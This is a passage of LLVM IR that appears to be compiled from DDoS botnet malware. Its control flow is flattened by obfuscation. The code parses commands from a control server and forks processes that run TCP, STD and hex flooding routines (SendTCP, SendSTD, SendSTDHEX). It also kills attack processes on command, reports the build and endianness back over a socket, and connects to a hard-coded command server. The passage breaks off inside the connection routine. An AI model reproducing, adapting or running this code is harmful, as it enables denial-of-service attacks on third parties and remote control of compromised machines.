  %233 = icmp sgt i32 %232, 5
  %234 = select i1 %233, i32 -703247651, i32 -3712855
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 5
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #9
  %240 = icmp slt i32 %239, 0
  %241 = select i1 %240, i32 1957480576, i32 -3712855
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i32, i32* %3, align 4
  %244 = icmp eq i32 %243, 7
  %245 = select i1 %244, i32 -434349524, i32 1989056355
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i8**, i8*** %4, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 6
  %249 = load i8*, i8** %248, align 8
  %250 = call i32 @atoi(i8* %249) #9
  %251 = icmp slt i32 %250, 1
  %252 = select i1 %251, i32 1957480576, i32 1989056355
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8**, i8*** %4, align 8
  %256 = getelementptr inbounds i8*, i8** %255, i64 1
  %257 = load i8*, i8** %256, align 8
  store i8* %257, i8** %12, align 8
  %258 = load i8**, i8*** %4, align 8
  %259 = getelementptr inbounds i8*, i8** %258, i64 2
  %260 = load i8*, i8** %259, align 8
  %261 = call i32 @atoi(i8* %260) #9
  store i32 %261, i32* %13, align 4
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 3
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* %264) #9
  store i32 %265, i32* %14, align 4
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 4
  %268 = load i8*, i8** %267, align 8
  store i8* %268, i8** %15, align 8
  %269 = load i32, i32* %3, align 4
  %270 = icmp eq i32 %269, 7
  %271 = select i1 %270, i32 1142685780, i32 1535187489
  store i32 %271, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i8**, i8*** %4, align 8
  %274 = getelementptr inbounds i8*, i8** %273, i64 6
  %275 = load i8*, i8** %274, align 8
  %276 = call i32 @atoi(i8* %275) #9
  store i32 523172277, i32* %switchVar
  store i32 %276, i32* %.reg2mem4
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 523172277, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %16, align 4
  %279 = load i32, i32* %3, align 4
  %280 = icmp sgt i32 %279, 5
  %281 = select i1 %280, i32 -1528642592, i32 1409798398
  store i32 %281, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i8**, i8*** %4, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 5
  %285 = load i8*, i8** %284, align 8
  %286 = call i32 @atoi(i8* %285) #9
  store i32 -297137684, i32* %switchVar
  store i32 %286, i32* %.reg2mem6
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -297137684, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %289 = load i8*, i8** %12, align 8
  %290 = call i8* @strstr(i8* %289, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %291 = icmp ne i8* %290, null
  %292 = select i1 %291, i32 766815109, i32 1989831542
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8*, i8** %12, align 8
  %295 = call i8* @strtok(i8* %294, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %295, i8** %19, align 8
  store i32 -1928697202, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %19, align 8
  %298 = icmp ne i8* %297, null
  %299 = select i1 %298, i32 -1128124125, i32 703501090
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = call i32 @listFork()
  %302 = icmp ne i32 %301, 0
  %303 = select i1 %302, i32 1504999512, i32 -2111710871
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i8*, i8** %19, align 8
  %306 = load i32, i32* %13, align 4
  %307 = load i32, i32* %14, align 4
  %308 = load i8*, i8** %15, align 8
  %309 = load i32, i32* %17, align 4
  %310 = load i32, i32* %16, align 4
  %311 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %305, i32 %306, i32 %307, i8* %308, i32 %309, i32 %310, i32 %311)
  call void @_exit(i32 0) #11
  unreachable

; <label>:312:                                    ; preds = %loopEntry
  %313 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %313, i8** %19, align 8
  store i32 -1928697202, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  store i32 268894968, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = call i32 @listFork()
  %317 = icmp ne i32 %316, 0
  %318 = select i1 %317, i32 1309707097, i32 -807351440
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i8*, i8** %12, align 8
  %322 = load i32, i32* %13, align 4
  %323 = load i32, i32* %14, align 4
  %324 = load i8*, i8** %15, align 8
  %325 = load i32, i32* %17, align 4
  %326 = load i32, i32* %16, align 4
  %327 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %321, i32 %322, i32 %323, i8* %324, i32 %325, i32 %326, i32 %327)
  call void @_exit(i32 0) #11
  unreachable

; <label>:328:                                    ; preds = %loopEntry
  store i32 -139948075, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 0
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @strcmp(i8* %332, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #9
  %334 = icmp ne i32 %333, 0
  %335 = select i1 %334, i32 -1030888811, i32 462881213
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i32, i32* %3, align 4
  %338 = icmp slt i32 %337, 4
  %339 = select i1 %338, i32 801409294, i32 -1677920293
  store i32 %339, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 2
  %343 = load i8*, i8** %342, align 8
  %344 = call i32 @atoi(i8* %343) #9
  %345 = icmp slt i32 %344, 1
  %346 = select i1 %345, i32 801409294, i32 291124716
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i8**, i8*** %4, align 8
  %349 = getelementptr inbounds i8*, i8** %348, i64 3
  %350 = load i8*, i8** %349, align 8
  %351 = call i32 @atoi(i8* %350) #9
  %352 = icmp slt i32 %351, 1
  %353 = select i1 %352, i32 801409294, i32 918586492
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 1
  %358 = load i8*, i8** %357, align 8
  store i8* %358, i8** %20, align 8
  %359 = load i8**, i8*** %4, align 8
  %360 = getelementptr inbounds i8*, i8** %359, i64 2
  %361 = load i8*, i8** %360, align 8
  %362 = call i32 @atoi(i8* %361) #9
  store i32 %362, i32* %21, align 4
  %363 = load i8**, i8*** %4, align 8
  %364 = getelementptr inbounds i8*, i8** %363, i64 3
  %365 = load i8*, i8** %364, align 8
  %366 = call i32 @atoi(i8* %365) #9
  store i32 %366, i32* %22, align 4
  %367 = load i8*, i8** %20, align 8
  %368 = call i8* @strstr(i8* %367, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %369 = icmp ne i8* %368, null
  %370 = select i1 %369, i32 -104721524, i32 -229194679
  store i32 %370, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i8*, i8** %20, align 8
  %373 = call i8* @strtok(i8* %372, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %373, i8** %23, align 8
  store i32 -824058880, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i8*, i8** %23, align 8
  %376 = icmp ne i8* %375, null
  %377 = select i1 %376, i32 -450287169, i32 -202676071
  store i32 %377, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = call i32 @listFork()
  %380 = icmp ne i32 %379, 0
  %381 = select i1 %380, i32 -866125530, i32 -1736701409
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i8*, i8** %23, align 8
  %384 = load i32, i32* %21, align 4
  %385 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %383, i32 %384, i32 %385)
  call void @_exit(i32 0) #11
  unreachable

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %387, i8** %23, align 8
  store i32 -824058880, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  store i32 -1042333730, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = call i32 @listFork()
  %391 = icmp ne i32 %390, 0
  %392 = select i1 %391, i32 -1745251133, i32 1593897545
  store i32 %392, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8*, i8** %20, align 8
  %396 = load i32, i32* %21, align 4
  %397 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %395, i32 %396, i32 %397)
  call void @_exit(i32 0) #11
  unreachable

; <label>:398:                                    ; preds = %loopEntry
  store i32 -1030888811, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  %400 = load i8**, i8*** %4, align 8
  %401 = getelementptr inbounds i8*, i8** %400, i64 0
  %402 = load i8*, i8** %401, align 8
  %403 = call i32 @strcmp(i8* %402, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.116, i32 0, i32 0)) #9
  %404 = icmp ne i32 %403, 0
  %405 = select i1 %404, i32 -1406930256, i32 -1678776078
  store i32 %405, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i32, i32* %3, align 4
  %408 = icmp slt i32 %407, 4
  %409 = select i1 %408, i32 -1843367926, i32 308159397
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i8**, i8*** %4, align 8
  %412 = getelementptr inbounds i8*, i8** %411, i64 2
  %413 = load i8*, i8** %412, align 8
  %414 = call i32 @atoi(i8* %413) #9
  %415 = icmp slt i32 %414, 1
  %416 = select i1 %415, i32 -1843367926, i32 -70330845
  store i32 %416, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 3
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @atoi(i8* %420) #9
  %422 = icmp slt i32 %421, 1
  %423 = select i1 %422, i32 -1843367926, i32 -108762959
  store i32 %423, i32* %switchVar
  br label %loopEnd

; <label>:424:                                    ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:425:                                    ; preds = %loopEntry
  %426 = load i8**, i8*** %4, align 8
  %427 = getelementptr inbounds i8*, i8** %426, i64 1
  %428 = load i8*, i8** %427, align 8
  store i8* %428, i8** %24, align 8
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 2
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #9
  store i32 %432, i32* %25, align 4
  %433 = load i8**, i8*** %4, align 8
  %434 = getelementptr inbounds i8*, i8** %433, i64 3
  %435 = load i8*, i8** %434, align 8
  %436 = call i32 @atoi(i8* %435) #9
  store i32 %436, i32* %26, align 4
  %437 = load i8*, i8** %24, align 8
  %438 = call i8* @strstr(i8* %437, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %439 = icmp ne i8* %438, null
  %440 = select i1 %439, i32 1958687164, i32 -1115075901
  store i32 %440, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  %442 = load i8*, i8** %24, align 8
  %443 = call i8* @strtok(i8* %442, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %443, i8** %27, align 8
  store i32 876186498, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load i8*, i8** %27, align 8
  %446 = icmp ne i8* %445, null
  %447 = select i1 %446, i32 -1317410157, i32 -441096034
  store i32 %447, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = call i32 @listFork()
  %450 = icmp ne i32 %449, 0
  %451 = select i1 %450, i32 798697875, i32 -1059668873
  store i32 %451, i32* %switchVar
  br label %loopEnd

; <label>:452:                                    ; preds = %loopEntry
  %453 = load i8*, i8** %27, align 8
  %454 = load i32, i32* %25, align 4
  %455 = load i32, i32* %26, align 4
  call void @SendSTDHEX(i8* %453, i32 %454, i32 %455)
  call void @_exit(i32 0) #11
  unreachable

; <label>:456:                                    ; preds = %loopEntry
  %457 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %457, i8** %27, align 8
  store i32 876186498, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  store i32 -2132134959, i32* %switchVar
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = call i32 @listFork()
  %461 = icmp ne i32 %460, 0
  %462 = select i1 %461, i32 -363082374, i32 -98432851
  store i32 %462, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i8*, i8** %24, align 8
  %466 = load i32, i32* %25, align 4
  %467 = load i32, i32* %26, align 4
  call void @SendSTDHEX(i8* %465, i32 %466, i32 %467)
  call void @_exit(i32 0) #11
  unreachable

; <label>:468:                                    ; preds = %loopEntry
  store i32 -1406930256, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = load i8**, i8*** %4, align 8
  %471 = getelementptr inbounds i8*, i8** %470, i64 0
  %472 = load i8*, i8** %471, align 8
  %473 = call i32 @strcmp(i8* %472, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0)) #9
  %474 = icmp ne i32 %473, 0
  %475 = select i1 %474, i32 -1343574273, i32 2005543123
  store i32 %475, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  store i32 0, i32* %28, align 4
  store i64 0, i64* %29, align 8
  store i32 -545631605, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  %478 = load i64, i64* %29, align 8
  %479 = load i64, i64* @numpids, align 8
  %480 = icmp ult i64 %478, %479
  %481 = select i1 %480, i32 1343728294, i32 1080523664
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i32*, i32** @pids, align 8
  %484 = load i64, i64* %29, align 8
  %485 = getelementptr inbounds i32, i32* %483, i64 %484
  %486 = load i32, i32* %485, align 4
  %487 = icmp ne i32 %486, 0
  %488 = select i1 %487, i32 -1827545624, i32 1209824537
  store i32 %488, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load i32*, i32** @pids, align 8
  %491 = load i64, i64* %29, align 8
  %492 = getelementptr inbounds i32, i32* %490, i64 %491
  %493 = load i32, i32* %492, align 4
  %494 = call i32 @getpid() #5
  %495 = icmp ne i32 %493, %494
  %496 = select i1 %495, i32 1017282912, i32 1209824537
  store i32 %496, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = load i32*, i32** @pids, align 8
  %499 = load i64, i64* %29, align 8
  %500 = getelementptr inbounds i32, i32* %498, i64 %499
  %501 = load i32, i32* %500, align 4
  %502 = call i32 @kill(i32 %501, i32 9) #5
  %503 = load i32, i32* %28, align 4
  %504 = add nsw i32 %503, 1
  store i32 %504, i32* %28, align 4
  store i32 1209824537, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  store i32 -1518156632, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i64, i64* %29, align 8
  %508 = add i64 %507, 1
  store i64 %508, i64* %29, align 8
  store i32 -545631605, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i32, i32* %28, align 4
  %511 = icmp sgt i32 %510, 0
  %512 = select i1 %511, i32 -223519774, i32 -1500222767
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  store i32 -1210502106, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  store i32 -1210502106, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  store i32 -1343574273, i32* %switchVar
  br label %loopEnd

; <label>:516:                                    ; preds = %loopEntry
  %517 = load i8**, i8*** %4, align 8
  %518 = getelementptr inbounds i8*, i8** %517, i64 0
  %519 = load i8*, i8** %518, align 8
  %520 = call i32 @strcmp(i8* %519, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0)) #9
  %521 = icmp ne i32 %520, 0
  %522 = select i1 %521, i32 -1462779459, i32 -1764301128
  store i32 %522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:524:                                    ; preds = %loopEntry
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 0
  %527 = load i8*, i8** %526, align 8
  %528 = call i32 @strcmp(i8* %527, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0)) #9
  %529 = icmp ne i32 %528, 0
  %530 = select i1 %529, i32 356111669, i32 -1681905996
  store i32 %530, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  call void @RemoveTempDirs()
  %532 = load i32, i32* @mainCommSock, align 4
  %533 = call i8* @getBuild()
  %534 = call i32 @getEndianness()
  %535 = call i32 (i32, i8*, ...) @sockprintf(i32 %532, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.120, i32 0, i32 0), i8* %533, i32 %534)
  store i32 356111669, i32* %switchVar
  br label %loopEnd

; <label>:536:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %531, %524, %516, %515, %514, %513, %509, %506, %505, %497, %489, %482, %477, %476, %469, %468, %463, %459, %458, %456, %448, %444, %441, %425, %424, %417, %410, %406, %399, %398, %393, %389, %388, %386, %378, %374, %371, %355, %354, %347, %340, %336, %329, %328, %319, %315, %314, %312, %300, %296, %293, %288, %287, %282, %278, %277, %272, %254, %253, %246, %242, %235, %231, %224, %217, %213, %206, %205, %197, %193, %192, %190, %179, %175, %172, %167, %166, %161, %142, %141, %134, %130, %123, %116, %109, %102, %98, %91, %67, %63, %62, %55, %48, %44, %37, %36, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -747457354, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar11 = load i32, i32* %switchVar
  switch i32 %switchVar11, label %switchDefault [
    i32 -747457354, label %NodeBlock9
    i32 1582573191, label %NodeBlock7
    i32 798034538, label %LeafBlock5
    i32 -178352631, label %LeafBlock3
    i32 -1650779910, label %NodeBlock
    i32 2070029687, label %LeafBlock1
    i32 -611740601, label %LeafBlock
    i32 105660324, label %20
    i32 -1143298807, label %21
    i32 602018274, label %22
    i32 534020099, label %23
    i32 2067186276, label %NewDefault
    i32 819010471, label %24
    i32 -1686217844, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload17, 33751041
  %13 = select i1 %Pivot10, i32 -1650779910, i32 1582573191
  store i32 %13, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem
  %Pivot8 = icmp slt i32 %.reload13, 50462976
  %14 = select i1 %Pivot8, i32 -178352631, i32 798034538
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock5:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf6 = icmp eq i32 %.reload, 50462976
  %15 = select i1 %SwitchLeaf6, i32 -1143298807, i32 2067186276
  store i32 %15, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload12, 33751041
  %16 = select i1 %SwitchLeaf4, i32 602018274, i32 2067186276
  store i32 %16, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload16, 16777986
  %17 = select i1 %Pivot, i32 -611740601, i32 2070029687
  store i32 %17, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload14 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload14, 16777986
  %18 = select i1 %SwitchLeaf2, i32 534020099, i32 2067186276
  store i32 %18, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload15 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload15, 66051
  %19 = select i1 %SwitchLeaf, i32 105660324, i32 2067186276
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 ptrtoint ([11 x i8]* @.str.123 to i32), i32* %1, align 4
  store i32 -1686217844, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 ptrtoint ([14 x i8]* @.str.124 to i32), i32* %1, align 4
  store i32 -1686217844, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 ptrtoint ([13 x i8]* @.str.125 to i32), i32* %1, align 4
  store i32 -1686217844, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 ptrtoint ([16 x i8]* @.str.126 to i32), i32* %1, align 4
  store i32 -1686217844, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 819010471, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 ptrtoint ([8 x i8]* @.str.127 to i32), i32* %1, align 4
  store i32 -1686217844, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %24, %NewDefault, %23, %22, %21, %20, %LeafBlock, %LeafBlock1, %NodeBlock, %LeafBlock3, %LeafBlock5, %NodeBlock7, %NodeBlock9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1609439238, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1609439238, label %first
    i32 181467799, label %8
    i32 -267153915, label %11
    i32 1689384992, label %17
    i32 1185539859, label %18
    i32 -913770949, label %21
    i32 -2067747134, label %32
    i32 168368533, label %39
    i32 1234750561, label %47
    i32 -1367731021, label %48
    i32 841397243, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 181467799, i32 -267153915
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 -267153915, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 1689384992, i32 1185539859
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -913770949, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -913770949, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #5
  store i32 23, i32* %3, align 4
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #9
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -2067747134, i32 168368533
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #9
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #9
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #9
  store i8 0, i8* %38, align 1
  store i32 168368533, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
